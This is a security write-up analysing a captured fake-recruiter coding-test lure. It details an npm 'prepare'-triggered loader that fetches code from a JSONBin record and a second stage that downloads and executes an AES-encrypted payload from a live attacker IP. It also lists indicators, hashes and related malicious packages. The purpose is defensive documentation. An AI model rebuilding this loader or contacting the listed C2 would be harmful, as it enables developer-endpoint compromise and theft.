# OAK field-collects a live fake-recruiter lure to check its own T15.001 page against a real specimen — and finds the page wrong on two points: the trigger is npm `prepare`, and the repository carries no payload at all — OnChainAttack, first-party collection — 2026-08-27

**Loss:** **Not applicable — no incident occurred.** This entry documents a **first-party field collection**, not an attack that landed. OAK already documented this technique from third-party reporting; an approach matching it arrived, was identified as such at first contact, and was walked to completion deliberately to obtain a live specimen and check the taxonomy's own claims against it. Every step — the reply, the GitHub username, the download — was a collection decision, and collection stopped short of execution by design. Non-execution was then **positively established** rather than assumed (see *Establishing that it did not run*). The check returned findings: two claims on the T15.001 page did not survive contact with a real specimen. This is the first OAK example whose primary sources are our own artefacts — the complete pretext correspondence with headers, the repository as delivered, and the first-stage payload as served.

**OAK Techniques observed:** **OAK-T15.001** (Social Engineering of Operator Personnel — *primary, confirmed mechanism*, in its **fake-recruiter / fake-coding-test** sub-shape, with two refinements the technique page did not carry: the trigger is the npm **`prepare`** lifecycle hook, not `postinstall`, and the repository ships **no payload at all** — only a pointer to a mutable remote record. See [`techniques/T15.001-social-engineering-of-operator-personnel.md`](../techniques/T15.001-social-engineering-of-operator-personnel.md)). **OAK-T15.003** (Operator-Endpoint Compromise — *intended end-state, deliberately not reached*. The loader provides arbitrary code execution under the developer account and the chain terminates in `execSync("node " + tmpfile)`; that endpoint state is what the operator was buying. See [`techniques/T15.003-operator-endpoint-compromise.md`](../techniques/T15.003-operator-endpoint-compromise.md)). **OAK-T11.009** (Trader-Tooling Supply-Chain Compromise targeting `.env` Private Keys — *plausible objective, unconfirmed*. The backend imports `server/config/db.js`, which calls `dotenv.config()` **before** the loader fires, so `process.env` is populated from the working directory's `.env` by the time attacker code runs. The final stage was never retrieved, so what it collects is unknown; OAK does not assert this mapping as observed. See [`techniques/T11.009-trader-tooling-supply-chain-env-key-compromise.md`](../techniques/T11.009-trader-tooling-supply-chain-env-key-compromise.md)).

**Unmapped layer (proposed):** the campaign's *identity* layer maps to no existing Technique — a lookalike recruiter domain borrowing a real genomics company's name, and a delivery account claiming employment at a major Ethereum software firm. Nothing was compromised, so T15.006 does not reach it; no transaction was ever solicited, so the victim-facing T4 / T5 / T6 impersonation family does not either. Proposed as a forward candidate in [`TAXONOMY-GAPS.md`](../TAXONOMY-GAPS.md) on this anchor.

**Attribution:** **unattributed.** The mail artefacts establish that the recruiter mailbox and the GitHub account acted in one coordinated delivery sequence — the recruiter promised a project-manager invitation, the supplied GitHub username was invited to the repository, and the recruiter replied "Invited" **eight seconds** after GitHub's transport timestamp. That is a High-confidence coordination finding. Everything past it is not established: the sending infrastructure is authenticated submission through a shared commercial mail provider over an AWS-hosted backend, which is materially stronger than visual spoofing but identifies nobody. The loader family overlaps published npm malware advisories (below) whose broader campaign space intersects DPRK-attributed activity in vendor reporting, but the evidence in hand supports **no group attribution** and OAK asserts none. The display names attached to the recruiter mailbox and the GitHub account are self-asserted and may be appropriated identities; they are recorded as string indicators, not as people.

**Key teaching point:** **A lure repository that contains no payload defeats the review that developers are told to perform.** The standard advice for an unsolicited "take-home assessment" is to read the code before running it — and reading this code finds a plausible Express route. The malicious content lives in an anonymous, publicly-writable JSON record fetched at runtime, so the repository is a pointer, not a weapon: it carries no attacker code to detect, its file hashes say nothing about what will execute, and the operator can change the payload after delivery without touching the repository. Two further choices close the gaps a careful developer would use. The trigger is **`prepare`**, which npm runs on a bare `npm install` — so "I'll install the dependencies so my editor resolves imports, then read the code" is already execution. And because the loader is checked into an ordinary application route rather than a dependency, **`npm install --ignore-scripts` does not save you either**: it blocks the hook, but the loader still fires the moment anything imports that route. Both halves of the usual advice fail. What remains is structural, and this case is what motivated OAK to give it an identifier: unsolicited code is evaluated on a machine that holds nothing, or it is not evaluated at all, and every manifest in the tree is read as text first — [`OAK-M48`](../mitigations/OAK-M48-unsolicited-code-quarantine.md), whose displaced-heuristics list is drawn directly from this specimen (OAK-M21, OAK-M45).

## Summary

OAK has documented the fake-recruiter / fake-coding-test vector since v0.1, entirely from other people's incidents. On **2026-08-27** an approach matching it arrived directly, was recognised immediately, and was run as a **collection exercise** rather than discarded: play the candidate, let the operator complete the delivery, capture every artefact, and compare what actually arrives against what the technique page claims arrives. Five hours later the payload chain was fully documented and two of the page's claims had been falsified. The operator's tempo, not the target's hesitation, set the pace.

The approach opened at **08:37 Europe/Kyiv** from `hr@dantelabs.io`, saying they had found the recipient's **GitHub profile** and noticed blockchain experience. The identity was well built: a London Web3 agency founded 2023, a five-step hiring process, a careers page. The domain had been registered **78 days earlier** and borrows the name of an unrelated real genomics company that has held the `.com` since 2015.

The maintainer replied in character, with a real CV and real links to two GitHub organisations — one of them OAK's own. At **12:49** the recruiter said the CV was impressive enough to **skip the intro call** and move straight to a "short take-home assessment, about 40–50 minutes". At **13:00** they asked for a GitHub username, saying **a project manager** would send the invitation — and the account that issued it was dressed to match, its profile claiming "Project Manager at **Consensys**". The campaign borrows the names of **two** real organisations, one per stage: a genomics company for the recruiter domain, a major Ethereum software firm for the GitHub persona. The username supplied was a **segregated account maintained for exactly this purpose** — not the maintainer's working identity, and holding no access to private repositories or organisations. At **13:03:43** GitHub delivered a genuine, DKIM-passing collaboration invitation to `mihaildeordiev443/test_assessment`, and **eight seconds later** the recruiter mailbox replied, in full: `Invited`.

The repository was downloaded through Safari at **13:31:32** — the macOS quarantine attribute records the browser and the timestamp — and extracted two minutes later. **1,367 files, 30.6 MB**, presenting as a React + Express "Theta chain explorer". No lockfile. No git metadata.

The execution chain is short and entirely checked in. Root `package.json` defines **`prepare`** as `concurrently "react-scripts start" "nodemon server.js"`, so a plain **`npm install` starts the backend**; `npm start` reaches the same place. `server.js` imports `server/routes/api/profile.js` while registering routes — no HTTP request to the API is needed. That file base64-decodes a JSONBin URL, fetches it with the nonstandard header **`bearrtoken: logo`**, reads the JSON field **`record.cerookie`**, and passes the returned string to **`Function.constructor`**, executing it with access to Node's `require`. The call sits at module scope, so it runs on import.

The record's contents at the time of retrieval were a JavaScript-obfuscator stage with a rotated string table and Base64/RC4 string decoding. Reconstructed statically, it: runs `npm install axios socket.io-client` synchronously with the working directory set to the OS temp directory and `windowsHide: true`; registers empty `uncaughtException` and `unhandledRejection` handlers so nothing surfaces; **assembles the address `5.175.184.8` arithmetically** rather than storing it; derives a 32-byte key with `scryptSync("6d75cc4302fcd53e9255561efb2224f8", "salt", 32)`; issues an HTTP GET to `http://5.175.184.8/api/service/6d75cc4302fcd53e9255561efb2224f8` with the header `Authentication: jwt`; treats the response as `base64(iv):base64(ciphertext)`, decrypts it with **AES-256-CBC**, writes the plaintext to `os.tmpdir()/wct1ECFA.tmp`, and runs it with `execSync("node " + tmpfile)`. Every failure path is swallowed.

**The secondary endpoint was never contacted, by decision.** Retrieving the final stage would have told the operator that this particular delivery had been opened and analysed, which forecloses observing the campaign further and invites re-targeting. The cost of that decision is stated plainly: what the final payload actually does is unknown and is not asserted anywhere in this entry.

The repository also declares `grayavatar: latest` in `server/package.json`. That is a published malicious package (`MAL-2025-6012`), but it is **not** reachable from a root `npm install` — it is a second route for anyone who installs from inside `server/`. The confirmed path does not depend on it, and three sibling packages carrying the same JSONBin / secret-header / `Function.constructor` loader shape have their own advisories (below). This is a **kit**, not a bespoke build, and the repository content is timestamped five days before the recruiter domain was registered.

Analysis ran in containers with `--network none`. The JSONBin record was retrieved exactly once, by a purpose-built one-shot client with a fixed destination, no redirects and a size limit, and **the JavaScript was never evaluated** — only decoded by Python. The full evidence package was assembled and hashed before anything was deleted.

## Timeline

Times are Europe/Kyiv (UTC+3). Transport-level values are authoritative; the four pretext timestamps are display values recovered from quoted message bodies, where per-message headers no longer exist.

| When | Event | OAK ref |
|---|---|---|
| 2015-11-08 | `dantelabs.com` registered to a real, unrelated genomics company whose name the pretext borrows | (context) |
| 2026-06-05 | Archive timestamps on all 1,367 files — repository content written five days before the recruiter domain existed. Archive timestamps are attacker-controllable; recorded, not relied on | (kit provenance, inference) |
| 2026-06-10 19:08 UTC | `dantelabs.io` registered via NameCheap behind an Icelandic privacy service | **T15.001 infrastructure** |
| 2026-08-18 13:19 UTC | GitHub delivery account `mihaildeordiev443` created; profile filled in **70 seconds later** claiming "Project Manager at **Consensys**", then never touched again. 0 public repositories, 0 followers | **T15.001 infrastructure** |
| 2026-08-27 08:37 | Cold outreach: "we came across your profile on GitHub", senior + intern blockchain roles, careers-page link. **Identified as hostile on receipt; engagement begins deliberately** | **T15.001 pretext** |
| 2026-08-27 (reply) | Maintainer replies in character with a CV and links to two public GitHub organisations | (collection decision) |
| 2026-08-27 12:49 | Intro call waived — "really impressed with your experience" — straight to a 40–50 minute take-home assessment | **T15.001 escalation** |
| 2026-08-27 13:00 | Recruiter requests GitHub username; states a project manager will issue the invitation | **T15.001 pivot to delivery** |
| 2026-08-27 13:00 | **Segregated GitHub account supplied** — purpose-maintained, no private-repository or organisation access | (operational separation) |
| 2026-08-27 13:03:43 | GitHub issues a genuine collaboration invitation to `mihaildeordiev443/test_assessment` (SPF/DKIM/DMARC pass) | **T15.001 delivery** |
| 2026-08-27 13:03:51 | Recruiter mailbox replies `Invited` — eight seconds after GitHub's transport timestamp | (coordination evidence) |
| 2026-08-27 13:31:32 | Repository archive downloaded via Safari (recorded in the macOS quarantine attribute) | (artefact captured) |
| 2026-08-27 13:33:46 | Archive extracted — 1,367 files, 30.6 MB, no lockfile, no git metadata | (artefact captured) |
| 2026-08-27 — | **`npm install` is never run — the collection stops short of execution by design** | (the boundary) |
| 2026-08-27 14:10 UTC+3 | JSONBin record retrieved once, in isolation, by a one-shot client; JavaScript never evaluated | (analysis) |
| 2026-08-27 ~14:39 | Evidence package sealed and hashed; secondary C2 deliberately never contacted | (analysis) |

## What defenders observed

- **The pretext was calibrated from the target's own public output.** The opening line — "we came across your profile on GitHub and noticed your blockchain experience" — is not a generic blast; it is credibility-laundering, anchoring on something real and verifiable about the target. For a defender the operative point is that this class of opener is cheap at scale: a public GitHub profile with blockchain repositories is sufficient targeting data, and nothing about receiving such a message indicates you were selected for anything but your visible surface.
- **Waiving the intro call is the tell that generalises, and it arrives before any code does.** A hiring process was described in five steps and then the first human-contact step was removed on the strength of a CV. Compressing straight to "run this code" is the pretext's objective surfacing. Any process that gets shorter the moment you engage is optimising for time-to-execution, and that is visible without technical analysis.
- **The delivery channel was authentic, which is the point.** The invitation was real GitHub mail and passed SPF, DKIM and DMARC, because a real GitHub account really did invite the target. No mail-authentication control was defeated, because none was attacked. Controls that key on sender authenticity have nothing to say about a hostile repository delivered through a legitimate platform.
- **The repository contained no attacker payload to find.** This is the finding that matters most for detection design. Static review of the checked-in files yields a plausible Express route; the executable content lived in an anonymous JSON record on a shared, legitimate service, fetched at import time. Repository file hashes are therefore useless as payload indicators, the record is mutable at the operator's discretion, and a scanner that clears the repository today makes no claim about tomorrow. The stable, hashable artefact is **the loader**, not the payload — which is why the detection rule written for this case matches the loader's structure (OAK-M40).
- **`prepare` moves execution earlier than the mental model expects.** Developers reason about `postinstall` as the dangerous hook. `prepare` runs on a bare `npm install`, so the common triage instinct is already the compromise — and because the loader is checked into an application route rather than a dependency, `--ignore-scripts` closes the hook but not the route: any subsequent `npm start`, test run, or import reaches the same module-scope call.
- **The concealment stack is individually deniable and collectively unambiguous.** A base64 URL, a nonstandard header, code stored under a cookie-sounding field name, `Function.constructor` instead of `eval`, an IP assembled by arithmetic, an RC4/base64 string table, dependencies installed into the temp directory at runtime, encrypted transport over plain HTTP, JavaScript written with a `.tmp` extension, a hidden Node process, and every exception swallowed. Any one has an innocent story. No legitimate telemetry or plugin system needs all thirteen.
- **It is a kit, and its layers age differently.** `grayavatar` has a public malware advisory from 2025-07; three sibling npm packages carrying the same loader shape have advisories from 2026-07 and 2026-08. The provenance stack reads: repository content timestamped **2026-06-05**, recruiter domain registered **2026-06-10**, GitHub delivery account created **2026-08-18**, campaign run **2026-08-27**. The payload tooling is the oldest and most reused layer; the delivery identity is the freshest and most disposable. A defender who burns the GitHub account has removed nine days of attacker investment, which is why account-level takedowns feel effective and change little.

## Establishing that it did not run

The engagement was designed to stop before execution, but design is not evidence. Post-incident guidance for this malware family correctly says that if the project was ever executed, deleting the directory is meaningless and the host must be treated as compromised — which makes the execution question worth answering with artefacts rather than recollection. OAK records the procedure because it has no other worked example of positively establishing this negative, and because anyone who *did* receive such a repository needs a way to check.

- **The repository never resolved.** No `node_modules`, no `package-lock.json`.
- **The npm cache never saw the manifest.** The cache held 2,547 index entries going back three months and contained none of the manifest's distinctive dependencies. This is the load-bearing check, because npm caches package metadata during resolution — *before* an install completes and before `prepare` would fire — so the absence covers even an interrupted install.
- **The negative was validated with a positive control.** A common dependency of the same manifest (`react-scripts`) **was** present in the cache from unrelated projects, confirming the search method finds what it looks for. A negative result from an unvalidated grep is not evidence.
- **Stage two left no trace.** The payload's first action is `npm install axios socket.io-client` with the temp directory as working directory. `socket.io-client` was absent from the cache, and the temp directory held no `node_modules` and no `package.json`.
- **Stage three left no trace.** No `wct1ECFA.tmp` or sibling artefacts in the temp directory. On macOS this window is meaningful: the temp directory is purged on a multi-day cycle and the incident was hours old.
- **No persistence.** Every LaunchAgent resolved to installed software, the only cron entry was a known personal job, and the shell startup files were three months untouched.
- **The coincidence in the timeline was resolved, not waved off.** Two npm debug logs sat one minute either side of the extraction timestamp. Both were unrelated — a global CLI install and an MCP server launch, each with a different working directory. Temporal proximity is not causation, and the way to know is to read the logs.

## Indicators

Shared infrastructure below is marked as such. The mail relays, the mail provider, and JSONBin are legitimate services and **must not** be blocked or treated as malicious on the strength of this incident; match on the combination of path, header and field, never on the domain alone.

### Campaign and delivery

- `hr@dantelabs.io` — recruiter mailbox and envelope sender
- `dantelabs.io` — recruitment identity domain, registered 2026-06-10 via NameCheap behind an Icelandic privacy service. Distinct from `dantelabs.com`, an unrelated genomics company registered 2015
- `mihaildeordiev443` — GitHub account issuing the invitation and owning the repository. Created **2026-08-18T13:19:04Z**, profile completed 70 seconds later and never updated; 0 public repositories, 0 followers, 0 following
- `318260339` — GitHub numeric user ID; rename-resistant pivot. Recovered independently from the invitation email's avatar URL and from the public API
- Profile claims `company: Consensys`, `bio: Project Manager at Consensys`, `location: United States` — a **second real organisation impersonated**, distinct from the recruiter domain's, and matched to the recruiter's stated promise that "the project manager will invite you to github"
- `mihaildeordiev443/test_assessment` — delivery repository; **private**, delivered by collaboration invitation rather than published, so it returns 404 to unauthenticated requests and is not enumerable
- Display names attached to the mailbox and the GitHub account are self-asserted, possibly appropriated, and are not treated by OAK as identities

### Loader (checked in, stable, hashable)

- `https://api.jsonbin.io/v3/b/6a4f5816f5f4af5e29762c92` — first-stage delivery. **Shared legitimate service** — match on the exact path plus the header plus the field
- Request header `bearrtoken: logo`
- JSON field `record.cerookie`
- Strings: `initPlugin`, `Function.constructor`
- `server/routes/api/profile.js` — SHA-256 `7f174fe6d6a3b4a4c2ed1f38db655e5a552eef0beba518720e59158492086f01`, 8,512 bytes
- Root `package.json` — SHA-256 `44011af5602e002b8f3e5a6c165f23a2d08503ae9a906f9964f5662a245592c0`; the `prepare` trigger
- Repository tree manifest — SHA-256 `fc0712e85db86f2d754ef9f2bdfded32f2447d22c8c480e5d0a5579063cf116f` over 1,367 files

### Second stage (mutable — valid only as retrieved 2026-08-27T11:10:32Z)

- Payload SHA-256 `b745a2fcecb21d736586bc39af9f8d9ec792ef59b4543a9da641ab4e1b059109`, 23,666 bytes
- `http://5.175.184.8/api/service/6d75cc4302fcd53e9255561efb2224f8`, request header `Authentication: jwt` — **never contacted**
- `scryptSync("6d75cc4302fcd53e9255561efb2224f8", "salt", 32)`; AES-256-CBC; wire format `base64(iv):base64(ciphertext)`
- Host artefacts: `os.tmpdir()/wct1ECFA.tmp`; `npm install axios socket.io-client` with the temp directory as working directory; `node <tmpfile>` with `windowsHide: true`

### Related npm advisories (same loader family)

- `grayavatar` — `MAL-2025-6012` — declared in `server/package.json`; reachable only from a nested install
- `express-request-engine@3.6.3` — `MAL-2026-10414`
- `express-route-engine@3.6.3` — `MAL-2026-14307`
- `express-session-handler@2.3.3` — `MAL-2026-14345`

**ATT&CK:** T1204.002, T1059.007, T1059.004, T1059.003, T1027, T1140, T1105, T1074.001

## Evidence and verification

This entry rests on **primary evidence collected first-hand** — the originals, not a reconstruction. That is the strongest source class available, and stronger than the second-hand vendor write-ups and press reporting the rest of this corpus is necessarily built from. The tiers below exist to make the entry *auditable*, not to apologise for it: they sort the claims by what a reader can confirm independently, and state plainly the narrow set that cannot be. The mechanism is not in that narrow set.

### Tier 1 — reproducible by anyone, now, with no artefacts from us

Four commands and one lookup reproduce the identity-layer findings independently. Observation date **2026-08-27**; these query live systems and may change (accounts get suspended, registrations lapse), so a later null result is not a contradiction.

- `dig +short TXT pf2023._domainkey.github.com` returns a published RSA key. **Consequence: the invitation email is cryptographically verifiable.** Its `DKIM-Signature` is `d=github.com; s=pf2023`, and anyone holding that EML can confirm GitHub sent it and that the signed headers are unaltered. The delivery half of this incident does not require trusting our copy.
- `dig +short TXT privateemail._domainkey.dantelabs.io` returns **nothing**. The recruiter message was signed `d=dantelabs.io; s=privateemail` against a selector with no published key — which is why Gmail recorded `dkim=permerror (no key for signature)` while SPF passed. The condition persists at observation date. **The recruiter half is therefore not signature-anchored, and the asymmetry is stated rather than glossed.**
- `dig +short TXT _dmarc.dantelabs.io` returns **nothing** — no DMARC policy. `dig +short TXT dantelabs.io` returns SPF only, `~all` softfail through a mainstream commercial provider. An established firm running senior-engineer recruiting normally has working DKIM and a DMARC record; this domain has neither.
- `whois dantelabs.io` → created **2026-06-10**, NameCheap, registrant behind an Icelandic privacy service. `whois dantelabs.com` → created **2015-11-08**, registrant organisation a real genomics company. The name-borrowing is checkable in two commands.
- `curl -s https://api.github.com/users/mihaildeordiev443` → `id: 318260339`, `created_at: 2026-08-18T13:19:04Z`, `updated_at: 2026-08-18T13:20:14Z`, `company: Consensys`, `public_repos: 0`, `followers: 0`. Account age against contact date, the 70-second profile completion, and the claimed affiliation all come from one unauthenticated request. The numeric ID also appears independently in the invitation email's avatar URL, so the two sources corroborate each other.
- The four npm advisories resolve at `osv.dev`: `MAL-2025-6012`, `MAL-2026-10414`, `MAL-2026-14307`, `MAL-2026-14345`.

The delivery repository itself is **private** and returns 404 unauthenticated, so it is not independently retrievable. It was not accessed for this write-up beyond the copy obtained during the engagement; cloning it now would be an authenticated action visible to its owner.

### Tier 2 — verifiable against the sealed evidence package

Content hashes are listed rather than an archive hash, because the archive is expected to be re-sealed and its digest is not a stable identifier. All values SHA-256.

| Artefact | SHA-256 | Size |
|---|---|---|
| Recruiter thread EML | `0af4b84d791a820373c342fffd10e76775d4837292d6d60894f42754bf2d7c10` | 23,550 |
| GitHub invitation EML | `0051ed7274fba8f6dd3a6e64b03a743d0ddf2a530909e30a1a820df6b0f066e0` | 25,318 |
| Repository tree manifest | `fc0712e85db86f2d754ef9f2bdfded32f2447d22c8c480e5d0a5579063cf116f` | 1,367 files |
| Root `package.json` (the `prepare` trigger) | `44011af5602e002b8f3e5a6c165f23a2d08503ae9a906f9964f5662a245592c0` | 2,232 |
| `server.js` | `46246e983ddd84a329d416becdf55f84e3512914ed91d5f6e4a37466194e8c17` | 1,561 |
| `server/routes/api/profile.js` (the loader) | `7f174fe6d6a3b4a4c2ed1f38db655e5a552eef0beba518720e59158492086f01` | 8,512 |
| `server/config/db.js` (`dotenv` before loader) | `e2e710f06ff434baa355199355d64620fa4eae1edf6d0e2b41d803a8d681b9eb` | 546 |
| `server/package.json` (nested, declares `grayavatar`) | `3d1f886b6d17da3e8925dc83b7e752d76786e590136780a37fe322cc240e0fef` | 934 |
| JSONBin HTTP response body as served | `e8d6ccfb9480c31789c4eda1b6912a0c396987473d8617bd75e02f682716264a` | 23,793 |
| Extracted `record.cerookie` payload | `b745a2fcecb21d736586bc39af9f8d9ec792ef59b4543a9da641ab4e1b059109` | 23,666 |

**Manifest definitions**, so the tree hash is reproducible rather than asserted: `repository-SHA256SUMS.txt` contains one `sha256  path` line per regular file, sorted lexicographically by POSIX relative path; the tree manifest hash above is the SHA-256 of that file's UTF-8 bytes. The evidence manifest is built the same way over the analysis artefacts.

**Acquisition metadata** for the mutable stage, recorded because the record can be changed at any time and this hash is a point observation, not a durable indicator: fetched `2026-08-27T11:10:32.617114+00:00`, HTTP 200, connected IP `172.67.176.5` (a Cloudflare edge, not attacker-unique), `redirect_followed: false`, request header `bearrtoken: logo`, response `ETag: W/"5cf1-JJcnBZX8BLYX7h2fUW6cY7iPkOI"`, `CF-RAY: a31aa15b69a8c273-VIE`. Retrieved once, by a fixed-destination one-shot client, in a container with no network access to anything else. **The JavaScript was never evaluated** — decoding was done in Python with networking disabled.

### Tier 3 — what rests on our word

- **That the correspondence is complete and unaltered.** We hold the only copies of the recruiter thread. Its headers are internally consistent and its transport timestamps interlock with the GitHub message to the second, but as established in Tier 1 it carries no verifiable signature. The GitHub message is the exception and anchors the delivery event.
- **That the repository as hashed is the repository as delivered.** The archive was downloaded through a browser and carries no git metadata, so there is no upstream commit to diff against. The macOS quarantine attribute records the browser and the timestamp, which is corroborating but self-reported.
- **That nothing was executed.** Evidenced by the checks in *Establishing that it did not run*, all performed on our own host. Independently unverifiable by construction.
- **That the JSONBin record served what we say it served.** The record is mutable and the observation is not reproducible; the response body hash fixes what we received, not what anyone else would receive.

## Public references

This example's primary sources are the first-party artefacts held by OAK — the two original EML files, the repository archive, the first-stage payload as served, per-file hashes for all 1,367 files, HTTP acquisition metadata, and a YARA rule for the loader — sealed as a hashed evidence package on 2026-08-27. They are originals rather than public documents; *Evidence and verification* above sets out exactly how each claim can be checked, and which few cannot. The references below are not the basis of this entry — they corroborate specific components of it.

- `[osvgrayavatar2025]` — OSV / GitHub Advisory Database, "Malicious code in grayavatar (npm)", `MAL-2025-6012`, published 2025-07-20 (alias `GHSA-crhf-hxhx-8cx4`; the package declared in this repository's nested `server/package.json`): <https://osv.dev/vulnerability/MAL-2025-6012>
- `[osvexpressrequestengine2026]` — OSV / GitHub Advisory Database, "Malicious code in express-request-engine (npm)", `MAL-2026-10414`, published 2026-07-13 (alias `GHSA-684q-384r-cr7r`; same JSONBin / secret-header / `Function.constructor` loader family): <https://osv.dev/vulnerability/MAL-2026-10414>
- `[osvexpressrouteengine2026]` — OSV / GitHub Advisory Database, "Malicious code in express-route-engine (npm)", `MAL-2026-14307`, published 2026-08-19: <https://osv.dev/vulnerability/MAL-2026-14307>
- `[osvexpresssessionhandler2026]` — OSV / GitHub Advisory Database, "Malicious code in express-session-handler (npm)", `MAL-2026-14345`, published 2026-08-21 (named explicitly in a checked-in comment in the delivered repository): <https://osv.dev/vulnerability/MAL-2026-14345>
- `[sealweb3supplychain]` — Security Alliance (SEAL), "Web3 Supply Chain Threats" (framework treatment of why Web3 supply-chain compromise can produce irreversible loss with no smart-contract exploitation): <https://frameworks.securityalliance.org/supply-chain/web3-supply-chain-threats/>

## Discussion

Every other example in OAK is reconstructed from someone else's incident. This one was collected on purpose, to answer a question the taxonomy could not answer about itself: does the technique we describe still look like that in the field? It did not, in two respects, and that is the entry's main contribution.

The evidence is unusually complete, and it is primary. We hold the pretext correspondence with headers, the delivery artefacts, the repository as delivered, and the first stage as served — a chain that public reporting on this campaign class almost never assembles in one place, because the victim's mailbox and the malware sample normally end up with different parties, and because most targets who recognise the lure simply delete it, which is correct for them and lossy for everyone else. Where prior OAK entries in the T15.001 family record *that* a fake coding test was delivered, this one records what the coding test was, down to the line number of the loader and the header it sends.

The evidence is also bounded, deliberately. The final stage was never retrieved. We know the loader hands arbitrary code to a Node process with `require` and the developer's authority; we do not know what the operator was serving that day, and we chose not to find out, because contacting the C2 announces that the delivery was opened and analysed. So the honest shape of this entry is: **mechanism fully documented, impact envelope bounded but not characterised.** Inferring wallet theft or credential exfiltration from what the family is known to do elsewhere would be exactly the fabricated-specificity failure OAK's methodology exists to prevent, and it is worth naming because the temptation is real when the capability is obvious.

On method, two notes for anyone repeating this. What was disclosed to keep the thread alive was a CV and links to two **public** GitHub organisations — a thin reply would have ended the exchange before delivery, and what went out was substantially already visible to anyone who looked. The consequential choice was the identity: the GitHub username handed over was a **segregated account maintained for this purpose**, with no access to private repositories or organisations, so the invitation landed somewhere disposable. That separation is the part worth copying, and the time to create such an account is well before it is needed rather than mid-thread. The remaining irreducible cost is simply that responding confirms a live address, which is worth accepting deliberately rather than by default.

Two findings here change what the T15.001 page says. The first is `prepare`. The technique previously described the npm vector as "an `npm install` whose post-install script runs a backdoor", which quietly implies a hook a careful developer neutralises with `--ignore-scripts`. Neither half held: the hook was `prepare`, which fires on plain install, and the loader was checked into an application route, so disabling scripts defers execution rather than preventing it. The second is the mutable stage. A lure repository shipping no payload is a materially different detection problem from one shipping an obfuscated blob, and it inverts the usual advice — the hash worth circulating is the loader's, and the payload hash is a perishable observation with a timestamp attached.

The timing is the last contribution, and it is cleaner than most cohort data. Five hours elapsed from cold email to repository on disk, against a published cohort median of under 30 days. That figure is not a measure of how fast a victim falls; the target here never stalled, never asked a qualifying question, and never introduced friction. It is therefore close to a clean measurement of **operator tempo against a maximally cooperative target** — an upper bound on how fast this campaign can convert an inbox into delivery, obtained without anyone being harmed to get it.
